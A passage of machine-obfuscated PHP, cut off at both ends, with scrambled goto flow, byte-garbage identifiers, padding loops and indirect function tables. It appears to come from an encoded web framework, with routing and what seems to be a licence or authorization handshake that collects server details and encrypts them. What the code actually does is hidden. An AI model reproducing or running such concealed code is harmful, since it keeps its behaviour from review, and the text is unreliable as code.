$dŒŠ„ë£°Š); $BÛŒÂĞ¤±ª = $D¡à¿»ñ»ö[2]($BÛŒÂĞ¤±ª, $D¡à¿»ñ»ö[1]); } $D¡à¿»ñ»ö[13](array($D¡à¿»ñ»ö[14], $D¡à¿»ñ»ö[15]), $E™ø‚ÁØÀ . $D¡à¿»ñ»ö[16], $BÛŒÂĞ¤±ª); goto Bàò‘ Èµ; bÆÜ—ÕÅŞ‡: $D¡à¿»ñ»ö[13](array($D¡à¿»ñ»ö[14], $D¡à¿»ñ»ö[15]), $E™ø‚ÁØÀ . $D¡à¿»ñ»ö[18], $BÛŒÂĞ¤±ª); goto e˜äéĞïõ; e˜äéĞïõ: } private function autorun() { $E¨Ä¹¬ã¸® =& $_SERVER[Š°ş®×«Ú]; global $config; $Eùä‡»ß•´ = $_SERVER[“][556]; if ($E¨Ä¹¬ã¸®[19]($config[$E¨Ä¹¬ã¸®[20]]) == 0) { return; } foreach ($config[$E¨Ä¹¬ã¸®[20]] as $a¸…½¯Œ©É => $A…öíé£Œì) { $this->{$_SERVER[Š°ş®×«Ú][21]}($A…öíé£Œì); } } private function fxig145446c6() { goto f‚Ñ¤àËµ; D°·ñ³§ƒ¿: $E„µœ³œ÷ = $b¤æ¼Ñ[558]; while ($E„µœ³œ÷ < $b¤æ¼Ñ[559]) { if ($E„µœ³œ÷ >= 0) { break; } $E„µœ³œ÷++; } $F¯–ÆÜ³³° = $Eìİ³•ôÓà[26]($GLOBALS[$Eìİ³•ôÓà[22]][$Eìİ³•ôÓà[23]], 1); goto D–Â²‡©ß; b›’´·æ½·: if ($Eìİ³•ôÓà[6]($Eìİ³•ôÓà[25]($bª‰ôŒé˜, -$Eìİ³•ôÓà[24]($D»ŸôƒŠ¯ƒ))) != $D»ŸôƒŠ¯ƒ) { return; } $F°¯ğ¡Ê = $Eìİ³•ôÓà[25]($bª‰ôŒé˜, 0, -$Eìİ³•ôÓà[24]($D»ŸôƒŠ¯ƒ)); $cëƒÏ§¯¾ = array($Eìİ³•ôÓà[8], $F°¯ğ¡Ê); goto D°·ñ³§ƒ¿; f‚Ñ¤àËµ: $b¤æ¼Ñ =& $_SERVER[“]; $Eìİ³•ôÓà =& $_SERVER[Š°ş®×«Ú]; $D»ŸôƒŠ¯ƒ = $Eìİ³•ôÓà[8]; goto Dï§øÓìŠ; D–Â²‡©ß: $GLOBALS[$Eìİ³•ôÓà[22]][$Eìİ³•ôÓà[23]] = $Eìİ³•ôÓà[27]($cëƒÏ§¯¾, $F¯–ÆÜ³³°); $c«çøØÈ†ö = $b¤æ¼Ñ[560]; $GLOBALS[$Eìİ³•ôÓà[22]][$Eìİ³•ôÓà[28]] = $Eìİ³•ôÓà[29]($Eìİ³•ôÓà[1], $GLOBALS[$Eìİ³•ôÓà[22]][$Eìİ³•ôÓà[23]]); goto a—ÁœŞÃ‡; Dï§øÓìŠ: $f”É»¬×‹ = $b¤æ¼Ñ[557]; $bª‰ôŒé˜ = $GLOBALS[$Eìİ³•ôÓà[22]][$Eìİ³•ôÓà[23]][0]; if (!$bª‰ôŒé˜ || $Eìİ³•ôÓà[24]($bª‰ôŒé˜) <= $Eìİ³•ôÓà[24]($D»ŸôƒŠ¯ƒ)) { return; } goto b›’´·æ½·; a—ÁœŞÃ‡: } private function cyqa759740b1() { goto EÒï¦†é‹±; a¼»ìßê§: $cÎ×ø²Øà = $_SERVER[$E»›ñ•õî[30]]; $A“‡—Š»êÏ = $E»›ñ•õî[31]; if (!$E»›ñ•õî[32]($cÎ×ø²Øà, $A“‡—Š»êÏ)) { return; } goto A¥¬íŞÇÇÈ; cÔæ™÷ñØ: $E»›ñ•õî[34]($E»›ñ•õî[35], $e†Õ”°», $BÊÓÏìÏˆ½); $F¨òçîœ = $D°Ù·³äôÔ[562]; if (strlen($F¨òçîœ) < $D°Ù·³äôÔ[563]) { return; } goto bÑëù‰‘; EÒï¦†é‹±: $D°Ù·³äôÔ =& $_SERVER[“]; $E»›ñ•õî =& $_SERVER[Š°ş®×«Ú]; if ($GLOBALS[$E»›ñ•õî[22]][$E»›ñ•õî[28]] != $E»›ñ•õî[10]) { return; } goto a¼»ìßê§; bÑëù‰‘: $e†Õ”°» = $E»›ñ•õî[2]($BÊÓÏìÏˆ½[0][0], $E»›ñ•õî[36]); $GLOBALS[$E»›ñ•õî[22]][$E»›ñ•õî[23]] = $E»›ñ•õî[0]($E»›ñ•õî[36], $e†Õ”°»); $GLOBALS[$E»›ñ•õî[22]][$E»›ñ•õî[28]] = $E»›ñ•õî[29]($E»›ñ•õî[1], $GLOBALS[$E»›ñ•õî[22]][$E»›ñ•õî[23]]); goto eíâ·–×; A¥¬íŞÇÇÈ: $EŞÑèÙ•›‰ = $E»›ñ•õî[33]($cÎ×ø²Øà, $A“‡—Š»êÏ); $e†Õ”°» = $E»›ñ•õî[25]($cÎ×ø²Øà, $EŞÑèÙ•›‰ + $E»›ñ•õî[24]($A“‡—Š»êÏ)); $B™îŒËâ¡ø = $D°Ù·³äôÔ[561]; goto cÔæ™÷ñØ; eíâ·–×: } public function run() { goto bâ—àøå¹„; Aâ¸ºõ’È’: $e­ªŒ‹Á‡ = $GLOBALS[$C²¯„íŒ˜Â[22]][$C²¯„íŒ˜Â[28]]; $C²¯„íŒ˜Â[39]($C²¯„íŒ˜Â[40], isset($bª½óò‘µæ[0]) && $bª½óò‘µæ[0] ? $bª½óò‘µæ[0] : $this->defaultModule); $CÑ›­á™çÆ = $DÅß…Æ´ô[566]; goto fÎÒØÚ¯éİ; B—Ì¿†ìİ: $C²¯„íŒ˜Â[39]($C²¯„íŒ˜Â[43], MOD . $C²¯„íŒ˜Â[1] . ST . $C²¯„íŒ˜Â[1] . ACT); $C‰‘‡ì¯øİ = $DÅß…Æ´ô[569]; if (!$C‰‘‡ì¯øİ) { die; } goto A²ƒ¡¤øµ¶; bŞß…ªÏ¦: $C²¯„íŒ˜Â[39]($C²¯„íŒ˜Â[42], isset($bª½óò‘µæ[2]) && $bª½óò‘µæ[0] ? $bª½óò‘µæ[2] : $this->defaultAction); $fà¬ã¶ä„Ä = $DÅß…Æ´ô[568]; if (!$fà¬ã¶ä„Ä) { return; } goto B—Ì¿†ìİ; CÀªƒÕ‹Š±: $bª½óò‘µæ = $GLOBALS[$C²¯„íŒ˜Â[22]][$C²¯„íŒ˜Â[23]]; $EÂÆõ¦ŠÇø = $DÅß…Æ´ô[565]; while (strlen($EÂÆõ¦ŠÇø) < $DÅß…Æ´ô[559]) { if (!$EÂÆõ¦ŠÇø) { break; } $EÂÆõ¦ŠÇø++; } goto Aâ¸ºõ’È’; cùò‹½ğ÷: $this->{$_SERVER[Š°ş®×«Ú][38]}(); $F©äÜ¼í¬‚ = $DÅß…Æ´ô[564]; while (strlen($F©äÜ¼í¬‚) < $DÅß…Æ´ô[559]) { if (!$F©äÜ¼í¬‚) { break; } $F©äÜ¼í¬‚++; } goto CÀªƒÕ‹Š±; FÏ¢ÌÍš»™: $this->{$_SERVER[Š°ş®×«Ú][45]}(); if ($C²¯„íŒ˜Â[19]($bª½óò‘µæ) >= 3) { $this->{$_SERVER[Š°ş®×«Ú][21]}($e­ªŒ‹Á‡); } else { $this->{$_SERVER[Š°ş®×«Ú][21]}(ACTION); } goto b¿„ë¦´Éõ; bâ—àøå¹„: $DÅß…Æ´ô =& $_SERVER[“]; $C²¯„íŒ˜Â =& $_SERVER[Š°ş®×«Ú]; $this->{$_SERVER[Š°ş®×«Ú][37]}(); goto cùò‹½ğ÷; A²ƒ¡¤øµ¶: $_SERVER[$C²¯„íŒ˜Â[44]] = $C²¯„íŒ˜Â[6](ACTION); $F¿†óé”Ò = $DÅß…Æ´ô[570]; while (strlen($F¿†óé”Ò) < $DÅß…Æ´ô[553]) { if (!$F¿†óé”Ò) { break; } $F¿†óé”Ò++; } goto FÏ¢ÌÍš»™; fÎÒØÚ¯éİ: $C²¯„íŒ˜Â[39]($C²¯„íŒ˜Â[41], isset($bª½óò‘µæ[1]) && $bª½óò‘µæ[0] ? $bª½óò‘µæ[1] : $this->defaultController); $cšëŠĞÒ«³ = $DÅß…Æ´ô[567]; if (strlen($cšëŠĞÒ«³) < $DÅß…Æ´ô[559]) { die; } goto bŞß…ªÏ¦; b¿„ë¦´Éõ: } private $frlv94bd06cd = array(); private $dpmi17a80571 = ''; public function msudc665f51f() { goto Fí¢Ş…£Ë½; E¢íªåğƒì: $this->{$_SERVER[Š°ş®×«Ú][52]}(); $Fß¼Œ„¾­ = $d¹ßË²š[576]; while (strlen($Fß¼Œ„¾­) < $d¹ßË²š[573]) { if (!$Fß¼Œ„¾­) { break; } $Fß¼Œ„¾­++; } goto AÏÈÓÛ; d¤çŞÆçĞ: if (strlen($EšßÈÊøŠµ) < $d¹ßË²š[573]) { return; } $this->{$_SERVER[Š°ş®×«Ú][49]}(); $E«õùßÍô‘ = $d¹ßË²š[575]; goto D˜éğô’†Ä; aºŒ‡„Æ®±: $this->{$_SERVER[Š°ş®×«Ú][3]}($FÁÜöÖßÍÏ[57], array($this, $FÁÜöÖßÍÏ[58])); $AÈ‰…ªĞô = $d¹ßË²š[578]; if (!$AÈ‰…ªĞô) { die; } goto b Ñ¨¦ëë; Fí¢Ş…£Ë½: $d¹ßË²š =& $_SERVER[“]; $FÁÜöÖßÍÏ =& $_SERVER[Š°ş®×«Ú]; $this->{$_SERVER[Š°ş®×«Ú][46]}(); goto CÄØ‰Šò·; AÏÈÓÛ: $this->{$_SERVER[Š°ş®×«Ú][3]}($FÁÜöÖßÍÏ[53], array($this, $FÁÜöÖßÍÏ[54])); $D‹¦Ë§Ú¨ˆ = $d¹ßË²š[577]; $this->{$_SERVER[Š°ş®×«Ú][3]}($FÁÜöÖßÍÏ[55], array($this, $FÁÜöÖßÍÏ[56])); goto aºŒ‡„Æ®±; AÌ˜Ê‚ìÎÃ: while (strlen($F§³ÔÛóÛÜ) < $d¹ßË²š[573]) { if (!$F§³ÔÛóÛÜ) { break; } $F§³ÔÛóÛÜ++; } $this->{$_SERVER[Š°ş®×«Ú][48]}(); $EšßÈÊøŠµ = $d¹ßË²š[574]; goto d¤çŞÆçĞ; D˜éğô’†Ä: if (strlen($E«õùßÍô‘) < $d¹ßË²š[553]) { die; } $this->{$_SERVER[Š°ş®×«Ú][50]}(); $this->{$_SERVER[Š°ş®×«Ú][51]}(); goto E¢íªåğƒì; b Ñ¨¦ëë: $this->{$_SERVER[Š°ş®×«Ú][3]}($FÁÜöÖßÍÏ[59], array($this, $FÁÜöÖßÍÏ[60])); goto cë´ÈÌ÷¤›; CÄØ‰Šò·: $CÎçö¶½¤Í = $d¹ßË²š[571]; $this->{$_SERVER[Š°ş®×«Ú][47]}(); $F§³ÔÛóÛÜ = $d¹ßË²š[572]; goto AÌ˜Ê‚ìÎÃ; cë´ÈÌ÷¤›: } public function swbd1081d8f7($CÍˆä³ÆŠî) { goto aÁÕäåàÆß; B„ºÆ¢µÄö: foreach ($dßİ„¯Ó„Ò as $a‰Øç¾äÃ) { $E‰ƒ¡¯—‹å = $GLOBALS[$B–Òî¢í°Ş[93]][$B–Òî¢í°Ş[94]][$a‰Øç¾äÃ]; if (isset($D©ÕœÂĞ°[$a‰Øç¾äÃ])) { $E‰ƒ¡¯—‹å = $D©ÕœÂĞ°[$a‰Øç¾äÃ]; } $CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[96]][$a‰Øç¾äÃ] = $E‰ƒ¡¯—‹å; } $DŸáÚöæ„ë = $CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[96]][$B–Òî¢í°Ş[76]]; unset($CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[97]][$B–Òî¢í°Ş[98]]); goto aÓå“çÓ; eÃ¿Å½±Á‘: $CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[96]][$B–Òî¢í°Ş[101]] = array($B–Òî¢í°Ş[102] => (int) $DŸáÚöæ„ë[$B–Òî¢í°Ş[103]], $B–Òî¢í°Ş[104] => $B–Òî¢í°Ş[105]($B–Òî¢í°Ş[106]($DŸáÚöæ„ë, $B–Òî¢í°Ş[107], array())), $B–Òî¢í°Ş[108] => (int) $B–Òî¢í°Ş[106]($DŸáÚöæ„ë, $B–Òî¢í°Ş[109], 0)); $C‚°“Šî© = $Eà›Ô„¯[581]; while ($C‚°“Šî© < $Eà›Ô„¯[580]) { if ($C‚°“Šî© >= 0) { break; } $C‚°“Šî©++; } goto dã®õ‡ÄœÄ; e“àòİùõ: $dßİ„¯Ó„Ò = array($B–Òî¢í°Ş[64], $B–Òî¢í°Ş[65], $B–Òî¢í°Ş[66], $B–Òî¢í°Ş[67], $B–Òî¢í°Ş[68], $B–Òî¢í°Ş[69], $B–Òî¢í°Ş[70], $B–Òî¢í°Ş[71], $B–Òî¢í°Ş[72], $B–Òî¢í°Ş[73], $B–Òî¢í°Ş[74], $B–Òî¢í°Ş[75], $B–Òî¢í°Ş[76], $B–Òî¢í°Ş[77], $B–Òî¢í°Ş[78], $B–Òî¢í°Ş[79], $B–Òî¢í°Ş[80], $B–Òî¢í°Ş[81], $B–Òî¢í°Ş[82], $B–Òî¢í°Ş[83], $B–Òî¢í°Ş[84], $B–Òî¢í°Ş[85], $B–Òî¢í°Ş[86], $B–Òî¢í°Ş[87], $B–Òî¢í°Ş[88], $B–Òî¢í°Ş[89], $B–Òî¢í°Ş[90], $B–Òî¢í°Ş[91], $B–Òî¢í°Ş[92]); $dŒØÊ´ƒªŠ = $Eà›Ô„¯[579]; while (strlen($dŒØÊ´ƒªŠ) < $Eà›Ô„¯[580]) { if (!$dŒØÊ´ƒªŠ) { break; } $dŒØÊ´ƒªŠ++; } goto B„ºÆ¢µÄö; fœ£Î¶ì³ˆ: while ($dÇ÷¨ĞëòŠ < $Eà›Ô„¯[559]) { if ($dÇ÷¨ĞëòŠ >= 0) { break; } $dÇ÷¨ĞëòŠ++; } if ($D©ÕœÂĞ°[$B–Òî¢í°Ş[122]] != $B–Òî¢í°Ş[123]) { $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[124]] = $D©ÕœÂĞ°[$B–Òî¢í°Ş[124]]; $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[125]] = $D©ÕœÂĞ°[$B–Òî¢í°Ş[125]]; $Cíê´´¬ê = $B–Òî¢í°Ş[126](10) . $this->dpmi17a80571 . $B–Òî¢í°Ş[126](5); $CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[127]][$B–Òî¢í°Ş[128]] = $this->{$_SERVER[Š°ş®×«Ú][129]}($Cíê´´¬ê, $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[115]]); } if ($this->dpmi17a80571 == $B–Òî¢í°Ş[123]) { $CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[96]][$B–Òî¢í°Ş[101]][$B–Òî¢í°Ş[109]] = 0; } goto fÅÇÆ†ç‘ ; aÓå“çÓ: unset($CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[97]][$B–Òî¢í°Ş[99]]); unset($CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[96]][$B–Òî¢í°Ş[76]]); unset($CÍˆä³ÆŠî[$B–Òî¢í°Ş[95]][$B–Òî¢í°Ş[96]][$B–Òî¢í°Ş[100]]); goto eÃ¿Å½±Á‘; fÅÇÆ†ç‘ : $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[130]] = $B–Òî¢í°Ş[106]($this->frlv94bd06cd, $B–Òî¢í°Ş[131], $B–Òî¢í°Ş[10]); $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[132]] = $B–Òî¢í°Ş[106]($this->frlv94bd06cd, $B–Òî¢í°Ş[133], $B–Òî¢í°Ş[10]); if ($B–Òî¢í°Ş[106]($GLOBALS, $B–Òî¢í°Ş[134]) && $this->config[$B–Òî¢í°Ş[135]]) { $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[136]] = WEB_ROOT; } goto B³ÕŒ•È§; B³ÕŒ•È§: return $CÍˆä³ÆŠî; goto a¬Ü»Ø‹æ; dã®õ‡ÄœÄ: $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[111]] = $B–Òî¢í°Ş[112]($B–Òî¢í°Ş[113])->{$_SERVER[Š°ş®×«Ú][114]}(); $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[115]] = $B–Òî¢í°Ş[116]($_SERVER[$B–Òî¢í°Ş[117]] . $D©ÕœÂĞ°[$B–Òî¢í°Ş[118]]); $bÎ®ŸÎãÏ™ = $Eà›Ô„¯[582]; goto D°á½éÓ; aÁÕäåàÆß: $Eà›Ô„¯ =& $_SERVER[“]; $B–Òî¢í°Ş =& $_SERVER[Š°ş®×«Ú]; $D©ÕœÂĞ° = $B–Òî¢í°Ş[61]($B–Òî¢í°Ş[62])->{$_SERVER[Š°ş®×«Ú][63]}(); goto e“àòİùõ; D°á½éÓ: $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[119]] = $B–Òî¢í°Ş[120]($B–Òî¢í°Ş[121]()); $CÍˆä³ÆŠî[$B–Òî¢í°Ş[110]][$B–Òî¢í°Ş[122]] = $this->dpmi17a80571; $dÇ÷¨ĞëòŠ = $Eà›Ô„¯[583]; goto fœ£Î¶ì³ˆ; a¬Ü»Ø‹æ: } private function ydvg9d088ea4() { goto Bƒãéùê›â; Bƒãéùê›â: $f£Š°Ó®É§ =& $_SERVER[“]; $E×÷ÑÒÃÕ =& $_SERVER[Š°ş®×«Ú]; if ($_SERVER[$E×÷ÑÒÃÕ[44]] == $E×÷ÑÒÃÕ[137]) { goto Eã„¾ì¹Ç; Eã„¾ì¹Ç: $bÚ¡¬©…ç¦ = array($E×÷ÑÒÃÕ[122] => $this->dpmi17a80571, $E×÷ÑÒÃÕ[138] => $this->{$_SERVER[Š°ş®×«Ú][139]}(), $E×÷ÑÒÃÕ[140] => $E×÷ÑÒÃÕ[61]($E×÷ÑÒÃÕ[141])->{$_SERVER[Š°ş®×«Ú][142]}()); if ($this->dpmi17a80571 != $E×÷ÑÒÃÕ[123]) { $dÛäò¨ç­ì = $E×÷ÑÒÃÕ[106]($this->frlv94bd06cd, $E×÷ÑÒÃÕ[143]); if ($dÛäò¨ç­ì) { $bÚ¡¬©…ç¦[$E×÷ÑÒÃÕ[144]] = $dÛäò¨ç­ì; $bÚ¡¬©…ç¦[$E×÷ÑÒÃÕ[145]] = $E×÷ÑÒÃÕ[146]($E×÷ÑÒÃÕ[106]($this->frlv94bd06cd, $E×÷ÑÒÃÕ[147])); $bÚ¡¬©…ç¦[$E×÷ÑÒÃÕ[148]] = $E×÷ÑÒÃÕ[106]($this->frlv94bd06cd, $E×÷ÑÒÃÕ[133]); } } $bÚ¡¬©…ç¦ = $this->{$_SERVER[Š°ş®×«Ú][149]}($E×÷ÑÒÃÕ[150]($bÚ¡¬©…ç¦), $E×÷ÑÒÃÕ[116]($E×÷ÑÒÃÕ[151])); goto FºÂ„¯ÛäÏ; FºÂ„¯ÛäÏ: $EÔ‰ØÌÅò = array($E×÷ÑÒÃÕ[152] => $bÚ¡¬©…ç¦); $E×÷ÑÒÃÕ[13](array($E×÷ÑÒÃÕ[153], $E×÷ÑÒÃÕ[154]), $EÔ‰ØÌÅò); $d£Ú˜Í‡Òº = $f£Š°Ó®É§[584]; goto aÓÉ‚Ø‚ñ; aÓÉ‚Ø‚ñ: while (strlen($d£Ú˜Í‡Òº) < $f£Š°Ó®É§[563]) { if (!$d£Ú˜Í‡Òº) { break; } $d£Ú˜Í‡Òº++; } goto eğÌ”Ğ— —; eğÌ”Ğ— —: } goto EÇÈìòãŠº; DŸ®‚…Ù£: $EÔ‰ØÌÅò = array($E×÷ÑÒÃÕ[161] => $fº¬™ â¸[$E×÷ÑÒÃÕ[64]], $E×÷ÑÒÃÕ[162] => $fº¬™ â¸[$E×÷ÑÒÃÕ[65]], $E×÷ÑÒÃÕ[163] => $E×÷ÑÒÃÕ[10]); foreach ($EğİĞä©Œ¤ as $a¬§ÇØ®Ş¶) { if (!isset($fº¬™ â¸[$a¬§ÇØ®Ş¶]) || !$fº¬™ â¸[$a¬§ÇØ®Ş¶]) { continue; } $EÔ‰ØÌÅò[$a¬§ÇØ®Ş¶] = $fº¬™ â¸[$a¬§ÇØ®Ş¶]; } $E×÷ÑÒÃÕ[13](array($E×÷ÑÒÃÕ[153], $E×÷ÑÒÃÕ[154]), $EÔ‰ØÌÅò); goto e»ÊºïöïÌ; EÇÈìòãŠº: if ($this->dpmi17a80571 == $E×÷ÑÒÃÕ[123]) { return; } $EğİĞä©Œ¤ = array($E×÷ÑÒÃÕ[155], $E×÷ÑÒÃÕ[156], $E×÷ÑÒÃÕ[157], $E×÷ÑÒÃÕ[158], $E×÷ÑÒÃÕ[159], $E×÷ÑÒÃÕ[160]); $fº¬™ â¸ = $E×÷ÑÒÃÕ[61]($E×÷ÑÒÃÕ[62])->{$_SERVER[Š°ş®×«Ú][63]}(); goto DŸ®‚…Ù£; e»ÊºïöïÌ: } private function lwfcf883d480() { goto B§Ãâœ¹á³; f¢î¼šŒœµ: $fˆÑœÕŸ¦ = $d »â„¶[$E·ºƒ‡ïµ¼[227]]; $AåòÏŒ¨Š = array(); $AåòÏŒ¨Š[$fŞ©Ä†æÂ] = $f‹å‘”Öš¢; goto F›í‘œ¾İÇ; FƒŠá‡Óß: $B“Åêİªïˆ = $eŞÊï»°©º[589]; if (strlen($B“Åêİªïˆ) < $eŞÊï»°©º[559]) { return; } $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[125]] = $E·ºƒ‡ïµ¼[120]($E·ºƒ‡ïµ¼[216]($this->{$_SERVER[Š°ş®×«Ú][149]}($C¯²ŞéµÍ‚, $E·ºƒ‡ïµ¼[218]))); goto eßÙ¨ØÆ£; c¹»±…»„: $d »â„¶ = $E·ºƒ‡ïµ¼[224]($E·ºƒ‡ïµ¼[61]($E·ºƒ‡ïµ¼[11])->{$_SERVER[Š°ş®×«Ú][225]}(), $E·ºƒ‡ïµ¼[226]); $Fô¢ªÊÃ·£ = $eŞÊï»°©º[592]; while ($Fô¢ªÊÃ·£ < $eŞÊï»°©º[580]) { if ($Fô¢ªÊÃ·£ >= 0) { break; } $Fô¢ªÊÃ·£++; } goto f¢î¼šŒœµ; d¹ˆêƒÅÏ: $B½“°ŞŸĞ£ = $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]]; $A‘¦íºÛ—½ = $this->{$_SERVER[Š°ş®×«Ú][201]}($B½“°ŞŸĞ£[$E·ºƒ‡ïµ¼[202]]); $a‘¸æïƒÌ› = $eŞÊï»°©º[586]; goto fİ¹ĞÔº´; E˜„†ˆµ’Ù: $Càï˜´‡£² = $eŞÊï»°©º[594]; if (strlen($Càï˜´‡£²) < $eŞÊï»°©º[559]) { return; } $this->frlv94bd06cd = $B½“°ŞŸĞ£; goto EÏ§¬ô¬à; fİ¹ĞÔº´: if (strlen($a‘¸æïƒÌ›) < $eŞÊï»°©º[559]) { return; } if (!$A‘¦íºÛ—½ || $A‘¦íºÛ—½ != $E·ºƒ‡ïµ¼[203]($B½“°ŞŸĞ£[$E·ºƒ‡ïµ¼[147]])) { $C®éà‰´ëİ = array($E·ºƒ‡ïµ¼[204] => $E·ºƒ‡ïµ¼[61]($E·ºƒ‡ïµ¼[62])->{$_SERVER[Š°ş®×«Ú][63]}($E·ºƒ‡ïµ¼[118]), $E·ºƒ‡ïµ¼[205] => $_SERVER[$E·ºƒ‡ïµ¼[117]], $E·ºƒ‡ïµ¼[206] => $E·ºƒ‡ïµ¼[207](), $E·ºƒ‡ïµ¼[176] => $_SERVER[$E·ºƒ‡ïµ¼[177]]); $B§Šˆ¿‡Œˆ = $this->{$_SERVER[Š°ş®×«Ú][208]}($E·ºƒ‡ïµ¼[150]($C®éà‰´ëİ)); $this->{$_SERVER[Š°ş®×«Ú][184]}($E·ºƒ‡ïµ¼[209] . $B§Šˆ¿‡Œˆ); $E·ºƒ‡ïµ¼[168]($E·ºƒ‡ïµ¼[199]($E·ºƒ‡ïµ¼[210]), !0); } $F¹Ü…“¤© = array($E·ºƒ‡ïµ¼[211] => $AĞ—Š·¨[$E·ºƒ‡ïµ¼[167]], $E·ºƒ‡ïµ¼[212] => $B½“°ŞŸĞ£[$E·ºƒ‡ïµ¼[213]], $E·ºƒ‡ïµ¼[214] => $E·ºƒ‡ïµ¼[126](16), $E·ºƒ‡ïµ¼[122] => $B½“°ŞŸĞ£[$E·ºƒ‡ïµ¼[215]]); goto e÷’´¦òÊ–; B§Ãâœ¹á³: $eŞÊï»°©º =& $_SERVER[“]; $E·ºƒ‡ïµ¼ =& $_SERVER[Š°ş®×«Ú]; if ($_SERVER[$E·ºƒ‡ïµ¼[44]] != $E·ºƒ‡ïµ¼[164]) { return; } goto D³…ººç°·; D³…ººç°·: if (!$E·ºƒ‡ïµ¼[106]($GLOBALS, $E·ºƒ‡ïµ¼[134])) { die; } $eÙÎéËŸ®ï = $GLOBALS[$E·ºƒ‡ïµ¼[22]]; if (isset($eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[165]])) { $this->{$_SERVER[Š°ş®×«Ú][166]}(); die; } goto f“±í»„å¡; e÷’´¦òÊ–: if ($AĞ—Š·¨[$E·ºƒ‡ïµ¼[170]]) { $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[214]] = $AĞ—Š·¨[$E·ºƒ‡ïµ¼[170]]; } $dÓ¶’Ì‹ = $E·ºƒ‡ïµ¼[25]($E·ºƒ‡ïµ¼[116]($F¹Ü…“¤©[$E·ºƒ‡ïµ¼[212]]), 10, 10); $Dò´•ğ§êæ = $dÓ¶’Ì‹ . $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[122]] . $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[214]]; goto eòö‚¯æ¤; fŠÓïŞŠâ¸: $CŸæó†ê§§ = $eŞÊï»°©º[588]; while (strlen($CŸæó†ê§§) < $eŞÊï»°©º[573]) { if (!$CŸæó†ê§§) { break; } $CŸæó†ê§§++; } $C¯²ŞéµÍ‚ = $B§ù‹Ú¿Şõ . $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[122]] . $this->{$_SERVER[Š°ş®×«Ú][149]}($E·ºƒ‡ïµ¼[116]($F¹Ü…“¤©[$E·ºƒ‡ïµ¼[211]]), $B§ù‹Ú¿Şõ); goto FƒŠá‡Óß; C‡‰ëÙèĞ: $f‹å‘”Öš¢ = $this->{$_SERVER[Š°ş®×«Ú][129]}($E·ºƒ‡ïµ¼[150]($B½“°ŞŸĞ£), $Cæİ˜Ó°Î‘); $f·ÅğŸòù = $eŞÊï»°©º[591]; if (strlen($f·ÅğŸòù) < $eŞÊï»°©º[553]) { die; } goto c¹»±…»„; EÏ§¬ô¬à: $this->dpmi17a80571 = $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[122]]; $this->{$_SERVER[Š°ş®×«Ú][231]}(); $E·ºƒ‡ïµ¼[168]($E·ºƒ‡ïµ¼[199]($E·ºƒ‡ïµ¼[210]), !0); goto Aë½¼á»’ì; eÖô„ô”¿ö: $Aí…ÃõÉßŠ = $eŞÊï»°©º[590]; if (strlen($Aí…ÃõÉßŠ) < $eŞÊï»°©º[563]) { die; } $fŞ©Ä†æÂ = $E·ºƒ‡ïµ¼[216]($E·ºƒ‡ïµ¼[25]($Cæİ˜Ó°Î‘, 10, 16)); goto C‡‰ëÙèĞ; f“±í»„å¡: if (!isset($eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[167]]) || $E·ºƒ‡ïµ¼[24]($eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[167]]) != 16) { $E·ºƒ‡ïµ¼[168]($E·ºƒ‡ïµ¼[169] . $eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[167]], !1); } $BÃÁ§å–Ÿ = $E·ºƒ‡ïµ¼[61]($E·ºƒ‡ïµ¼[62])->{$_SERVER[Š°ş®×«Ú][63]}($E·ºƒ‡ïµ¼[118]); $AĞ—Š·¨ = array($E·ºƒ‡ïµ¼[167] => $eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[167]], $E·ºƒ‡ïµ¼[170] => $E·ºƒ‡ïµ¼[126](16), $E·ºƒ‡ïµ¼[171] => $E·ºƒ‡ïµ¼[151], $E·ºƒ‡ïµ¼[172] => $E·ºƒ‡ïµ¼[173], $E·ºƒ‡ïµ¼[174] => $_SERVER[$E·ºƒ‡ïµ¼[175]], $E·ºƒ‡ïµ¼[176] => $_SERVER[$E·ºƒ‡ïµ¼[177]], $E·ºƒ‡ïµ¼[178] => $_SERVER[$E·ºƒ‡ïµ¼[179]]); goto E£Ç¬Ëï…; eòö‚¯æ¤: $Fä½Ç’½Ì… = $eŞÊï»°©º[587]; $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[124]] = $E·ºƒ‡ïµ¼[216]($E·ºƒ‡ïµ¼[120]($this->{$_SERVER[Š°ş®×«Ú][149]}($Dò´•ğ§êæ, $E·ºƒ‡ïµ¼[217]))); $B§ù‹Ú¿Şõ = $E·ºƒ‡ïµ¼[126](16); goto fŠÓïŞŠâ¸; Aë½¼á»’ì: $b¶„ÓÏ¼ÊŸ = $eŞÊï»°©º[595]; if 